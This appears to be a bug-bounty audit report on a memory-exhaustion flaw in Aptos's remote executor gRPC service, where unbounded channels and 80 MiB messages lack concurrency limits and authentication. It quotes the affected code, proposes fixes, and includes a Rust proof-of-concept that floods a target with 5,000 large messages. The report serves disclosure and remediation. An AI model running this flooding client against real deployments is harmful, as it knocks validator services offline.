# Audit Report

## Title
Memory Exhaustion via Unbounded Concurrent gRPC Messages in Remote Executor Service

## Summary
The remote executor service's gRPC network handler allows attackers to send multiple concurrent 80 MiB messages without any concurrency limits, rate limiting, or authentication, leading to memory exhaustion and potential service crashes. Messages are buffered in unbounded channels, enabling resource exhaustion attacks.

## Finding Description
The `GRPCNetworkMessageServiceServerWrapper` in the secure/net module accepts gRPC messages up to 80 MiB in size without implementing any concurrency control, connection limits, or rate limiting. [1](#0-0) 

When a message is received via `simple_msg_exchange`, it is immediately allocated in memory and sent through an unbounded channel: [2](#0-1) 

The network controller creates these channels using `unbounded()` from crossbeam, providing no backpressure mechanism: [3](#0-2) 

The gRPC server is configured only with a timeout and max message size, but lacks critical protections present in other services: [4](#0-3) 

In contrast, other gRPC services in the codebase (like peer-monitoring-service) use `BoundedExecutor` to limit concurrent requests: [5](#0-4) 

**Attack Scenario:**
1. Attacker discovers the remote executor service endpoint (if exposed to network)
2. Opens 50 concurrent TCP connections to the gRPC service
3. Each connection establishes ~100 HTTP/2 streams (default limit)
4. Each stream sends one 80 MiB `SimpleMsgExchange` request
5. Total concurrent messages: 50 × 100 = 5,000 messages
6. Total memory usage: 5,000 × 80 MiB = 400 GB
7. If the receiver thread is slow or blocked, messages accumulate in unbounded channels
8. The executor service runs out of memory and crashes

The service is used when sharded execution is enabled: [6](#0-5) 

## Impact Explanation
This vulnerability qualifies as **High Severity** under the Aptos bug bounty program:

- **Validator node slowdowns**: Memory exhaustion causes performance degradation in block execution
- **Service crashes**: Out-of-memory conditions crash the executor service, requiring restart
- **Significant protocol violations**: Disrupts the sharded execution pipeline if enabled

While sharded execution is not enabled by default and requires explicit configuration, any deployment using this feature becomes vulnerable. The remote executor service has a standalone binary for production deployment: [7](#0-6) 

The lack of basic security controls (no authentication, no rate limiting, unbounded resources) in a production-ready service component represents a significant security gap.

## Likelihood Explanation
**Likelihood: Medium-to-Low** but **Impact: High** where deployed

The attack requires:
- Sharded execution feature to be enabled (not default)
- Remote executor service endpoints to be network-accessible
- No external firewall/rate limiting at infrastructure level

However, exploitation is trivial once conditions are met:
- No authentication required
- Simple gRPC client can perform the attack
- HTTP/2 multiplexing enables high message concurrency per connection
- Resource exhaustion is deterministic

## Recommendation
Implement multiple layers of protection:

1. **Add concurrency limits** using `BoundedExecutor`:
```rust
// In network_controller/mod.rs
use aptos_bounded_executor::BoundedExecutor;

pub struct NetworkController {
    // ... existing fields
    bounded_executor: BoundedExecutor,
}

// Limit concurrent message processing
impl NetworkController {
    pub fn new(service: String, listen_addr: SocketAddr, timeout_ms: u64) -> Self {
        let bounded_executor = BoundedExecutor::new(
            100, // max_concurrent_requests
            tokio::runtime::Handle::current(),
        );
        // ... rest of initialization
    }
}
```

2. **Replace unbounded channels with bounded channels**:
```rust
// In network_controller/mod.rs, replace:
let (inbound_sender, inbound_receiver) = unbounded();
// With:
let (inbound_sender, inbound_receiver) = crossbeam_channel::bounded(1024);
```

3. **Add connection-level rate limiting** in the gRPC server setup:
```rust
// In grpc_network_service/mod.rs
Server::builder()
    .timeout(std::time::Duration::from_millis(rpc_timeout_ms))
    .concurrency_limit_per_connection(32) // if available in tonic version
    .add_service(...)
```

4. **Implement authentication** using TLS client certificates or token-based auth
5. **Add message size monitoring and alerting**
6. **Document security requirements** for deployment configurations

## Proof of Concept
```rust
// PoC: Concurrent message sender to exhaust memory
use aptos_protos::remote_executor::v1::{
    network_message_service_client::NetworkMessageServiceClient,
    NetworkMessage,
};
use tokio::time::{sleep, Duration};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let target_addr = "http://[remote-executor-ip]:port";
    let message_size = 80 * 1024 * 1024; // 80 MiB
    let num_connections = 50;
    let messages_per_connection = 100;
    
    let mut handles = vec![];
    
    for conn_id in 0..num_connections {
        let target = target_addr.to_string();
        let handle = tokio::spawn(async move {
            let mut client = NetworkMessageServiceClient::connect(target)
                .await
                .expect("Failed to connect");
            
            for msg_id in 0..messages_per_connection {
                let large_message = vec![0u8; message_size];
                let request = tonic::Request::new(NetworkMessage {
                    message: large_message,
                    message_type: format!("attack_msg_{}_{}", conn_id, msg_id),
                });
                
                // Send without waiting for response (fire and forget)
                tokio::spawn(async move {
                    let _ = client.simple_msg_exchange(request).await;
                });
                
                // Small delay to avoid overwhelming local network
                sleep(Duration::from_millis(10)).await;
            }
        });
        handles.push(handle);
    }
    
    // Wait for all connections to finish sending
    for handle in handles {
        handle.await?;
    }
    
    println!("Sent {} total messages of {} MiB each", 
             num_connections * messages_per_connection, 
             message_size / (1024 * 1024));
    println!("Total memory pressure: ~{} GB", 
             (num_connections * messages_per_connection * message_size) / (1024 * 1024 * 1024));
    
    Ok(())
}
```

## Notes
- This vulnerability only affects deployments with sharded execution enabled
- The remote executor service is designed for trusted internal network communication, but lacks defense-in-depth
- Operators should ensure proper network segmentation and firewall rules
- The issue demonstrates insufficient security considerations in the secure/net module design

### Citations

**File:** secure/net/src/grpc_network_service/mod.rs (L23-23)
```rust
const MAX_MESSAGE_SIZE: usize = 1024 * 1024 * 80;
```

**File:** secure/net/src/grpc_network_service/mod.rs (L75-87)
```rust
        Server::builder()
            .timeout(std::time::Duration::from_millis(rpc_timeout_ms))
            .add_service(
                NetworkMessageServiceServer::new(self).max_decoding_message_size(MAX_MESSAGE_SIZE),
            )
            .add_service(reflection_service)
            .serve_with_shutdown(server_addr, async {
                server_shutdown_rx.await.ok();
                info!("Received signal to shutdown server at {:?}", server_addr);
            })
            .await
            .unwrap();
        info!("Server shutdown at {:?}", server_addr);
```

**File:** secure/net/src/grpc_network_service/mod.rs (L93-115)
```rust
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
```

**File:** secure/net/src/network_controller/mod.rs (L128-136)
```rust
    pub fn create_inbound_channel(&mut self, message_type: String) -> Receiver<Message> {
        let (inbound_sender, inbound_receiver) = unbounded();

        self.inbound_handler
            .lock()
            .unwrap()
            .register_handler(message_type, inbound_sender);

        inbound_receiver
```

**File:** peer-monitoring-service/server/src/lib.rs (L66-69)
```rust
        let bounded_executor = BoundedExecutor::new(
            node_config.peer_monitoring_service.max_concurrent_requests as usize,
            executor,
        );
```

**File:** execution/executor/src/workflow/do_get_execution_output.rs (L256-276)
```rust
    fn execute_block_sharded<V: VMBlockExecutor>(
        partitioned_txns: PartitionedTransactions,
        state_view: Arc<CachedStateView>,
        onchain_config: BlockExecutorConfigFromOnchain,
    ) -> Result<Vec<TransactionOutput>> {
        if !get_remote_addresses().is_empty() {
            Ok(V::execute_block_sharded(
                &REMOTE_SHARDED_BLOCK_EXECUTOR.lock(),
                partitioned_txns,
                state_view,
                onchain_config,
            )?)
        } else {
            Ok(V::execute_block_sharded(
                &SHARDED_BLOCK_EXECUTOR.lock(),
                partitioned_txns,
                state_view,
                onchain_config,
            )?)
        }
    }
```

**File:** execution/executor-service/src/main.rs (L27-48)
```rust
fn main() {
    let args = Args::parse();
    aptos_logger::Logger::new().init();

    let (tx, rx) = crossbeam_channel::unbounded();
    ctrlc::set_handler(move || {
        tx.send(()).unwrap();
    })
    .expect("Error setting Ctrl-C handler");

    let _exe_service = ProcessExecutorService::new(
        args.shard_id,
        args.num_shards,
        args.num_executor_threads,
        args.coordinator_address,
        args.remote_executor_addresses,
    );

    rx.recv()
        .expect("Could not receive Ctrl-C msg from channel.");
    info!("Process executor service shutdown successfully.");
}
```
